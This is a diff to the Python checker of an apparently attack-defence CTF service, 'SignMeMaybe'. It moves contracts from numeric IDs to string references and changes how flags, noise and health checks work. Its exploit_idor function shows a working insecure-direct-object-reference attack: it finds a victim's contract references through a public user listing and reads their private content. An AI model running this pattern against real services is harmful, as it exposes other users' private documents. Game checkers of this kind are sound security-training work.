@@ -2,10 +2,9 @@ import asyncio
 import json
 import os
 import random
-import re
 import string
 from logging import LoggerAdapter
-from typing import Any, Iterable, Optional
+from typing import Any, Optional
 from urllib import error, request
 
 from enochecker3 import (
@@ -29,7 +28,6 @@ Checker config
 
 SERVICE_PORT = 1984
 HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
-MAX_CONTRACT_ID = int(os.getenv("SIGNMEMAYBE_MAX_CONTRACT_ID", "250"))
 
 checker = Enochecker("SignMeMaybe", SERVICE_PORT)
 app = lambda: checker.app
@@ -41,10 +39,61 @@ Utility functions
 
 JsonObject = dict[str, Any]
 
+NAME_PARTS = [
+    "arden",
+    "briar",
+    "cai",
+    "darin",
+    "ellis",
+    "finn",
+    "gale",
+    "halen",
+    "ivan",
+    "jules",
+    "kieran",
+    "linden",
+    "marin",
+    "nolan",
+    "orren",
+    "pavel",
+    "quinn",
+    "rowan",
+    "soren",
+    "talin",
+    "vanya",
+    "wren",
+]
+
+HANDLE_PARTS = [
+    "archive",
+    "atlas",
+    "bridge",
+    "civic",
+    "docket",
+    "field",
+    "ledger",
+    "matrix",
+    "morrow",
+    "notary",
+    "parcel",
+    "record",
+    "signal",
+    "vector",
+    "vault",
+]
+
 
 def random_suffix(length: int = 16) -> str:
     alphabet = string.ascii_lowercase + string.digits
     return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def random_username() -> str:
+    return f"{random.choice(NAME_PARTS)}_{random.choice(HANDLE_PARTS)}_{random.randint(10000, 99999)}"
+
+
+def random_password() -> str:
+    return "pass-" + random_suffix(24)
 
 
 def service_base_url(task: Any) -> str:
@@ -163,7 +212,7 @@ class HttpClient:
 
         return user_id, username, token
 
-    async def create_contract(self, token: str, title: str, content: str) -> int:
+    async def create_contract(self, token: str, title: str, content: str) -> str:
         status, data = await self.request_json(
             "POST",
             "/api/contracts",
@@ -178,12 +227,12 @@ class HttpClient:
             raise MumbleException(f"Failed to create contract: HTTP {status}")
 
         data_obj = require_json_object(data, "contract creation response")
-        contract_id = data_obj.get("contractId")
+        reference = data_obj.get("reference")
 
-        if not isinstance(contract_id, int) or contract_id <= 0:
-            raise MumbleException("Contract creation response did not contain a valid contractId")
+        if not isinstance(reference, str) or not reference.startswith("CNTR-"):
+            raise MumbleException("Contract creation response did not contain a valid reference")
 
-        return contract_id
+        return reference
 
     async def list_contracts(self, token: str) -> list[JsonObject]:
         status, data = await self.request_json("GET", "/api/contracts", token=token)
@@ -199,10 +248,16 @@ class HttpClient:
 
         return [contract for contract in contracts if isinstance(contract, dict)]
 
-    async def latest_contract_version(self, token: str, contract_id: int) -> tuple[int, Any]:
+    async def public_contracts_by_username(self, username: str) -> tuple[int, Any]:
         return await self.request_json(
             "GET",
-            f"/api/contracts/{contract_id}/versions/latest",
+            f"/api/users/{username}/contracts",
+        )
+
+    async def latest_contract_version(self, token: str, reference: str) -> tuple[int, Any]:
+        return await self.request_json(
+            "GET",
+            f"/api/contracts/{reference}/versions/latest",
             token=token,
         )
 
@@ -218,51 +273,63 @@ def get_string_field(data: JsonObject, key: str, context: str) -> str:
     return value
 
 
-def extract_contract_ids_from_hints(task: ExploitCheckerTaskMessage) -> list[int]:
+def extract_usernames_from_hints(task: ExploitCheckerTaskMessage) -> list[str]:
     possible_hints = [
         getattr(task, "attack_info", None),
         getattr(task, "flag_ids", None),
         getattr(task, "flag_id", None),
     ]
 
-    found: list[int] = []
+    found: list[str] = []
     for hint in possible_hints:
-        found.extend(_extract_contract_ids(hint))
+        found.extend(_extract_usernames(hint))
 
-    seen: set[int] = set()
-    unique_ids: list[int] = []
-    for contract_id in found:
-        if contract_id > 0 and contract_id not in seen:
-            seen.add(contract_id)
-            unique_ids.append(contract_id)
+    seen: set[str] = set()
+    unique_usernames: list[str] = []
+    for username in found:
+        if username not in seen:
+            seen.add(username)
+            unique_usernames.append(username)
 
-    return unique_ids
+    return unique_usernames
 
 
-def _extract_contract_ids(value: Any) -> list[int]:
+def _extract_usernames(value: Any) -> list[str]:
     if value is None:
         return []
 
-    if isinstance(value, int):
-        return [value]
-
     if isinstance(value, str):
-        return [int(match) for match in re.findall(r"\d+", value)]
+        value = value.strip()
+        if not value:
+            return []
+
+        try:
+            decoded = json.loads(value)
+        except json.JSONDecodeError:
+            decoded = None
+
+        if decoded is not None:
+            return _extract_usernames(decoded)
+
+        if 3 <= len(value) <= 40 and all(c.isalnum() or c in "_-" for c in value):
+            return [value]
+
+        return []
 
     if isinstance(value, dict):
-        result: list[int] = []
-        for key in ("contractId", "contract_id", "id", "hint"):
+        result: list[str] = []
+        for key in ("username", "ownerUsername", "attackInfo", "attack_info", "flagId", "flag_id", "hint"):
             if key in value:
-                result.extend(_extract_contract_ids(value[key]))
+                result.extend(_extract_usernames(value[key]))
         if not result:
             for nested in value.values():
-                result.extend(_extract_contract_ids(nested))
+                result.extend(_extract_usernames(nested))
         return result
 
-    if isinstance(value, Iterable):
-        result: list[int] = []
+    if isinstance(value, (list, tuple, set)):
+        result: list[str] = []
         for nested in value:
-            result.extend(_extract_contract_ids(nested))
+            result.extend(_extract_usernames(nested))
         return result
 
     return []
@@ -278,23 +345,23 @@ async def putflag_contract(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     logger: LoggerAdapter,
-) -> int:
+) -> str:
     client = make_client(task, logger)
 
-    username = "checker_" + random_suffix(16)
-    password = "checkerpass_" + random_suffix(16)
+    username = random_username()
+    password = random_password()
     title = "Signing Package " + random_suffix(12)
 
     logger.debug("Registering flag owner")
     _user_id, _username, token = await client.register_user(username, password)
 
     logger.debug("Creating contract that contains the flag")
-    contract_id = await client.create_contract(token, title, task.flag)
+    reference = await client.create_contract(token, title, task.flag)
 
     logger.debug("Checking that the new contract is present in the owner's list")
     contracts = await client.list_contracts(token)
-    listed_ids = [contract.get("contractId") for contract in contracts]
-    assert_in(contract_id, listed_ids, "Created contract was not visible in the owner's list")
+    listed_references = [contract.get("reference") for contract in contracts]
+    assert_in(reference, listed_references, "Created contract was not visible in the owner's list")
 
     await db.set(
         "contract",
@@ -302,12 +369,11 @@ async def putflag_contract(
             "username": username,
             "password": password,
             "title": title,
-            "contract_id": contract_id,
+            "reference": reference,
         },
     )
 
-    # I return the contract id as attack hint so exploits do not have to scan the whole service.
-    return str(contract_id)
+    return username
 
 
 @checker.getflag(0)
@@ -322,15 +388,15 @@ async def getflag_contract(
         stored = await db.get("contract")
         username = stored["username"]
         password = stored["password"]
-        contract_id = int(stored["contract_id"])
-    except (KeyError, TypeError, ValueError) as exc:
+        reference = stored["reference"]
+    except (KeyError, TypeError) as exc:
         raise MumbleException("Missing or broken database entry from putflag") from exc
 
     logger.debug("Logging in as the flag owner")
     _user_id, _username, token = await client.login_user(username, password)
 
     logger.debug("Retrieving own latest contract version")
-    status, data = await client.latest_contract_version(token, contract_id)
+    status, data = await client.latest_contract_version(token, reference)
 
     if status != 200:
         raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")
@@ -348,8 +414,8 @@ async def putnoise_contract(
 ) -> None:
     client = make_client(task, logger)
 
-    username = "noise_" + random_suffix(16)
-    password = "noisepass_" + random_suffix(16)
+    username = random_username()
+    password = random_password()
     title = "Reference Contract " + random_suffix(12)
     content = "Noise contract body " + random_suffix(36)
 
@@ -357,12 +423,12 @@ async def putnoise_contract(
     _user_id, _username, token = await client.register_user(username, password)
 
     logger.debug("Creating noise contract")
-    contract_id = await client.create_contract(token, title, content)
+    reference = await client.create_contract(token, title, content)
 
     logger.debug("Checking that the noise contract is present in the owner's list")
     contracts = await client.list_contracts(token)
-    listed_ids = [contract.get("contractId") for contract in contracts]
-    assert_in(contract_id, listed_ids, "Created noise contract was not visible in the owner's list")
+    listed_references = [contract.get("reference") for contract in contracts]
+    assert_in(reference, listed_references, "Created noise contract was not visible in the owner's list")
 
     await db.set(
         "noise_contract",
@@ -371,7 +437,7 @@ async def putnoise_contract(
             "password": password,
             "title": title,
             "content": content,
-            "contract_id": contract_id,
+            "reference": reference,
         },
     )
 
@@ -390,8 +456,8 @@ async def getnoise_contract(
         password = stored["password"]
         title = stored["title"]
         content = stored["content"]
-        contract_id = int(stored["contract_id"])
-    except (KeyError, TypeError, ValueError) as exc:
+        reference = stored["reference"]
+    except (KeyError, TypeError) as exc:
         raise MumbleException("Missing or broken database entry from putnoise") from exc
 
     logger.debug("Logging in as the noise owner")
@@ -399,11 +465,11 @@ async def getnoise_contract(
 
     logger.debug("Checking that the noise contract is still listed")
     contracts = await client.list_contracts(token)
-    listed_ids = [contract.get("contractId") for contract in contracts]
-    assert_in(contract_id, listed_ids, "Noise contract was not visible in the owner's list")
+    listed_references = [contract.get("reference") for contract in contracts]
+    assert_in(reference, listed_references, "Noise contract was not visible in the owner's list")
 
     logger.debug("Retrieving noise contract")
-    status, data = await client.latest_contract_version(token, contract_id)
+    status, data = await client.latest_contract_version(token, reference)
 
     if status != 200:
         raise MumbleException(f"Could not retrieve stored noise contract: HTTP {status}")
@@ -435,8 +501,8 @@ async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> 
 async def havoc_contract_flow(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
     client = make_client(task, logger)
 
-    username = "havoc_" + random_suffix(16)
-    password = "havocpass_" + random_suffix(16)
+    username = random_username()
+    password = random_password()
     title = "Havoc Contract " + random_suffix(12)
     content = "contract text " + random_suffix(32)
 
@@ -444,16 +510,16 @@ async def havoc_contract_flow(task: HavocCheckerTaskMessage, logger: LoggerAdapt
     _user_id, _username, token = await client.register_user(username, password)
 
     logger.debug("Creating a havoc contract")
-    contract_id = await client.create_contract(token, title, content)
+    reference = await client.create_contract(token, title, content)
 
     logger.debug("Retrieving the havoc contract")
-    status, data = await client.latest_contract_version(token, contract_id)
+    status, data = await client.latest_contract_version(token, reference)
 
     if status != 200:
         raise MumbleException(f"Could not retrieve havoc contract: HTTP {status}")
 
     data_obj = require_json_object(data, "havoc latest contract response")
-    assert_equals(data_obj.get("contractId"), contract_id, "Wrong contract id returned")
+    assert_equals(data_obj.get("reference"), reference, "Wrong contract reference returned")
     assert_equals(data_obj.get("title"), title, "Wrong contract title returned")
     assert_equals(data_obj.get("content"), content, "Wrong contract content returned")
 
@@ -466,33 +532,55 @@ async def exploit_idor(
 ) -> Optional[str]:
     client = make_client(task, logger)
 
-    username = "attacker_" + random_suffix(16)
-    password = "attackpass_" + random_suffix(16)
+    username = random_username()
+    password = random_password()
 
     logger.debug("Registering attacker account")
     _user_id, _username, token = await client.register_user(username, password)
 
-    contract_ids = extract_contract_ids_from_hints(task)
-    if not contract_ids:
-        contract_ids = list(range(1, MAX_CONTRACT_ID + 1))
+    target_usernames = extract_usernames_from_hints(task)
+    if not target_usernames:
+        raise MumbleException("exploit did not receive a target username")
 
-    logger.debug("Trying %d contract ids via latest-version IDOR", len(contract_ids))
-    for contract_id in contract_ids:
-        status, data = await client.latest_contract_version(token, contract_id)
+    logger.debug("Resolving %d target usernames via public archive metadata", len(target_usernames))
+    for target_username in target_usernames:
+        status, data = await client.public_contracts_by_username(target_username)
 
         if status == 404:
             continue
-        if status == 401:
-            raise MumbleException("Attacker session was rejected")
         if status != 200:
-            logger.debug("Skipping contract %s because it returned HTTP %s", contract_id, status)
+            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
             continue
         if not isinstance(data, dict):
             continue
 
-        raw = json.dumps(data, ensure_ascii=False).encode("utf-8", errors="replace")
-        if flag := searcher.search_flag(raw):
-            return flag
+        contracts = data.get("contracts")
+        if not isinstance(contracts, list):
+            continue
+
+        for contract in contracts:
+            if not isinstance(contract, dict):
+                continue
+
+            reference = contract.get("reference")
+            if not isinstance(reference, str) or not reference:
+                continue
+
+            status, latest = await client.latest_contract_version(token, reference)
+
+            if status == 404:
+                continue
+            if status == 401:
+                raise MumbleException("Attacker session was rejected")
+            if status != 200:
+                logger.debug("Skipping reference %s because latest returned HTTP %s", reference, status)
+                continue
+            if not isinstance(latest, dict):
+                continue
+
+            raw = json.dumps(latest, ensure_ascii=False).encode("utf-8", errors="replace")
+            if flag := searcher.search_flag(raw):
+                return flag
 
     raise MumbleException("flag not found")
 
